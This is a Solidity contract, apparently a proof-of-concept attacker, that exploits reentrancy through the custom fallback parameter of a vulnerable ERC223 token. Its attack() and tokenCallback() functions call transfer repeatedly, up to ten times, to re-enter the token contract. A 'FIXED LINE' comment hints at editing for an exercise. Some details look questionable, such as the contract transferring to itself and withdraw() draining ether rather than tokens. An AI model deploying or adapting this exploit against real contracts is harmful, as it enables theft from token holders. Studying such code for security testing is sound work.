// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableERC223 {
    function transfer(address _to, uint _value, bytes calldata _data, string calldata _custom_fallback) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableERC223 public token;
    address public owner;
    uint256 public attackCount;
    uint256 public attackValue;

    constructor(address _tokenAddress) {
        token = IVulnerableERC223(_tokenAddress);
        owner = msg.sender;
    }

    function tokenCallback(address, uint256, bytes calldata) external {
        if (attackCount < 10 && token.balanceOf(address(this)) >= attackValue) {  // FIXED LINE
            attackCount++;
            token.transfer(address(this), attackValue, "", "tokenCallback(address,uint256,bytes)");
        }
    }

    function attack(uint256 _value) external {
        require(msg.sender == owner, "Not owner");
        attackValue = _value;
        attackCount = 0;
        token.transfer(address(this), _value, "", "tokenCallback(address,uint256,bytes)");
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}